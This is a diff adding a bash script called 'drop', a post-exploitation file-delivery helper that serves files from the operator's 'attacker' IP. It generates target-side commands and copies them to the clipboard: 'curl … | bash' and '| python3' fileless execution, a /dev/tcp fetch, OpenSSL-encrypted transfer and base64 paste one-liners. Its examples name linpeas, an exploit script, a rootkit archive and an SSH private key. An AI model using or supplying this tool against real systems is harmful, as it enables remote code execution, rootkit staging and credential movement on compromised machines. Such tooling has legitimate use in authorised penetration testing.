@@ -1,0 +1,230 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+
+# Define colors
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+BOLD_WHITE="\e[1;37m"
+WHITE="\e[37m"
+BRIGHT_WHITE="\e[97m"
+RESET="\e[0m"
+COLOR=$BRIGHT_WHITE
+
+
+FILE="${1:-}"
+CASE="${2:-http}"
+ARG3="${3:-}"  # meaning depends on CASE
+
+echo ""
+
+# If user passed a directory, create a temp tar.gz and serve that instead.
+TMPFILE=""
+if [[ -n "$FILE" && -d "$FILE" ]]; then
+  # create a safe temp file name (avoids collisions)
+  TMPFILE="$(mktemp --tmpdir="$(pwd)" "$(basename "$FILE").XXXXXX.tar.gz" 2>/dev/null || mktemp /tmp/"$(basename "$FILE").XXXXXX.tar.gz")"
+  tar -C "$(dirname "$FILE")" -czf "$TMPFILE" "$(basename "$FILE")"
+  # point FILE/BASE at the temp archive so rest of script treats it like a file
+  FILE="$TMPFILE"
+  BASE="$(basename "$FILE")"
+  # mark that we created a temp file for cleanup
+  export DROP_CREATED_TMP=1
+fi
+
+
+if [[ -z "$FILE" || ! -f "$FILE" || "$1" == "-h" || "$1" == "--help" ]]; then
+  echo -e "${MAGENTA}HELP: drop - The Linux File Delivery Helper${RESET}"
+  echo -e "Usage: $(basename "$0") ${CYAN}<file>${RESET} ${YELLOW}[method]${RESET} [port]"
+  echo -e "-----------------------------------------------------------------------"
+
+  # Table Header
+  printf "  ${YELLOW}%-12s${RESET} %-15s %s\n" "METHOD" "DEFAULT" "DESCRIPTION"
+  printf "  %-12s %-15s %s\n" "------" "-------" "-----------"
+  
+  # Method Rows
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "http" "Port 8080" "Serves file via Python/Go web server"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "fileless" "IEX-style" "Serves script for memory execution (curl|bash)"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "bash" "Port 9001" "TCP fallback using /dev/tcp (No curl/wget needed)"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "encrypted" "Port 443" "SSL/TLS encrypted delivery via OpenSSL"
+  printf "  ${GREEN}%-12s${RESET} %-15s %s\n" "offline" "Base64" "Generates a B64 'cat' one-liner for pasting"
+
+  echo -e "\n${MAGENTA}EXAMPLES:${RESET}"
+  echo -e "  $(basename "$0") linpeas.sh              # Serve via HTTP on 8080"
+  echo -e "  $(basename "$0") exploit.sh fileless     # Target: curl http://IP/s.sh | bash"
+  echo -e "  $(basename "$0") busybox bash 9001       # Target: cat < /dev/tcp/IP/9001 > file"
+  echo -e "  $(basename "$0") rootkit.tar.gz enc      # Encrypted delivery"
+  echo -e "  $(basename "$0") id_rsa offline          # B64 string for terminal pasting"
+
+  echo -e "\n${CYAN}Action:${RESET} The target download command is automatically copied to your ${YELLOW}clipboard${RESET}."
+  exit 1
+fi
+
+
+IP=${IP:-}
+
+# 1) try tun0 if not provided
+if [[ -z $IP ]] && ip -br addr show dev tun0 &>/dev/null; then
+  IP="$(ip -br -4 addr show dev tun0 | awk '{print $3}' | cut -d/ -f1)"
+fi
+
+# 2) default-route source IP
+if [[ -z $IP ]]; then
+  IP="$(ip route get 1.1.1.1 2>/dev/null \
+        | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}')"
+fi
+
+# 3) first non-loopback global IPv4
+if [[ -z $IP ]]; then
+  IP="$(ip -4 -br addr show scope global 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 | head -n1)"
+fi
+
+if [[ -z $IP ]]; then
+  echo "[-] Could not determine an attacker/machine IP. Export \$IP, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
+  exit 1
+fi
+
+BASE="$(basename "$FILE")"
+DIR="$(cd "$(dirname "$FILE")" 2>/dev/null || pwd)"
+
+# Defaults for ports / share
+PORT="${ARG3:-8080}"
+SHARE="${ARG3:-share}"
+
+# Smart low-port fallback (needs root for <1024)
+if [[ "$CASE" =~ ^(http|fileless|bash|encrypted|offline)$ ]]; then
+  if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+    echo "[!] Port ${PORT} requires root. Falling back to 8080."
+    PORT=8080
+  fi
+fi
+
+case "$CASE" in
+  
+  http)
+    echo -e "${MAGENTA}=== HTTP ==="
+
+    
+    if [[ -n "${DROP_CREATED_TMP:-}" ]]; then
+      # We created a tarball from a directory — show the streaming extract helper only
+      echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | tar xz -C .${RESET}"
+      echo -e "${COLOR}curl -s http://${IP}:${PORT}/${BASE} | tar xz -C .${RESET}"
+      echo "curl -s http://${IP}:${PORT}/${BASE} | tar xz -C ." | xclip -selection clipboard
+      echo -e "${GREEN}→ curl helper copied to clipboard"
+
+    else
+      # Normal single-file download examples
+      echo -e "${COLOR}wget http://${IP}:${PORT}/${BASE} -O ${BASE}${RESET}"
+      echo -e "${COLOR}curl -o ${BASE} http://${IP}:${PORT}/${BASE}${RESET}"
+      echo -e "curl -o ${BASE} http://${IP}:${PORT}/${BASE}" | xclip -selection clipboard
+      echo -e "${GREEN}→ curl helper copied to clipboard"
+    fi
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
+    python3 -m http.server "$PORT" --bind 0.0.0.0
+    ;;
+
+  fileless)
+
+
+    echo -e "${MAGENTA}=== Fileless ==="
+        case "$BASE" in
+
+      *.sh)
+        echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | bash${RESET}"
+        echo -e "${COLOR}curl http://${IP}:${PORT}/${BASE} | bash${RESET}"
+        echo "curl http://${IP}:${PORT}/${BASE} | bash" | xclip -selection clipboard
+        echo -e "${GREEN}→ curl helper copied to clipboard"
+        ;;
+        
+        *.py)      
+        echo -e "${COLOR}wget -qO- http://${IP}:${PORT}/${BASE} | python3${RESET}"
+        echo -e "${COLOR}curl http://${IP}:${PORT}/${BASE} | python3${RESET}"
+        echo "curl http://${IP}:${PORT}/${BASE} | python3" | xclip -selection clipboard
+        echo -e "${GREEN}→ curl helper copied to clipboard"
+        ;;
+        
+        *)
+        echo -e "${RED}→Not an executable script (unknown or unsupported extension): ${BASE}${RESET}"
+        echo -e "${RED}→Falling back to regular HTTP download (no fileless execution).${RESET}"
+        echo -e "${COLOR}wget http://${IP}:${PORT}/${BASE} -O ${BASE}${RESET}"
+        echo -e "${COLOR}curl -o ${BASE} http://${IP}:${PORT}/${BASE}${RESET}"
+        echo -e "curl -o ${BASE} http://${IP}:${PORT}/${BASE}" | xclip -selection clipboard
+        echo -e "${GREEN}→ curl helper copied to clipboard"
+      ;;
+      esac
+
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
+    python3 -m http.server "$PORT" --bind 0.0.0.0
+    ;;
+   
+   
+
+  bash)
+    echo -e "${MAGENTA}=== dev/tcp fallback ===${WHITE}"
+
+    echo
+    # print literal commands (no colors, no chmod)
+    
+    echo "exec 3<>/dev/tcp/${IP}/${PORT}"
+    echo "echo -e \"GET /${BASE} HTTP/1.1\\r\\nHost: ${IP}:${PORT}\\r\\nConnection: close\\r\\n\\r\\n\" >&3"
+    echo "awk 'BEGIN{RS=\"\\r\\n\\r\\n\"} NR==2{print > \"${BASE}\"}' <&3"
+    
+    CMD="exec 3<>/dev/tcp/${IP}/${PORT}; \
+    echo -e \"GET /${BASE} HTTP/1.1\r\nHost: ${IP}:${PORT}\r\nConnection: close\r\n\r\n\" >&3; \
+    awk 'BEGIN{RS=\"\r\n\r\n\"} NR==2{print > \"${BASE}\"}' <&3"
+    echo "$CMD" | xclip -selection clipboard
+    echo -e "${GREEN}→ copied to clipboard"
+
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
+    python3 -m http.server "$PORT" --bind 0.0.0.0
+    ;;
+
+  encrypted)
+    echo -e "${MAGENTA}=== Encrypted ===${COLOR}"
+    DIR="$(cd "$(dirname "$FILE")" 2>/dev/null && pwd || pwd)"
+    openssl enc -aes256 -pbkdf2 -in "${FILE}" -out "${DIR}/${BASE}.enc"
+    echo
+    echo -e "${COLOR}wget http://${IP}:${PORT}/${BASE}.enc -O ${BASE}.enc${RESET}"
+    echo -e "${COLOR}curl -s http://${IP}:${PORT}/${BASE}.enc -o ${BASE}.enc${RESET}"
+    echo "curl -s http://${IP}:${PORT}/${BASE}.enc -o ${BASE}.enc" | xclip -selection clipboard
+    echo -e "${GREEN}→ (curl helper copied to clipboard)"
+    echo
+    echo -e "${MAGENTA}Decrypt on target with: "
+    echo -e "${COLOR}openssl enc -d -aes256 -pbkdf2 -in ${BASE}.enc -out ${BASE}${RESET}"
+    echo
+    echo -e "${YELLOW}[*] Serving ${BASE}.enc at http://${IP}:${PORT}/"
+    python3 -m http.server "$PORT" --bind 0.0.0.0 
+    ;;
+
+  offline)
+    # one-line pasteable decode with embedded base64
+    ENCODED="$(base64 "${FILE}" | tr -d '\n')"
+    echo -e "${MAGENTA}=== Offline Base64 ==="
+    if [[ -n "${DROP_CREATED_TMP:-}" ]]; then
+      # archived directory -> stream decode directly into tar extract
+      echo -e "${COLOR}echo '${ENCODED}' | base64 -d | tar xz -C ."
+      echo "echo '${ENCODED}' | base64 -d | tar xz -C ." | xclip -selection clipboard
+      echo -e "${GREEN}→ (helper copied to clipboard)"
+    else
+      # normal file -> decode to file
+      echo -e "${COLOR}echo '${ENCODED}' | base64 -d > ${BASE}"
+      echo -e "echo '${ENCODED}' | base64 -d > ${BASE}" | xclip -selection clipboard
+      echo -e "${GREEN}→ (helper copied to clipboard)"
+    fi
+    ;;
+    
+
+  *)
+    echo "[-] Unknown case: ${CASE}. Use: http|fileless|bash|encrypted|offline" >&2
+    exit 1
+    ;;
+
+
+esac
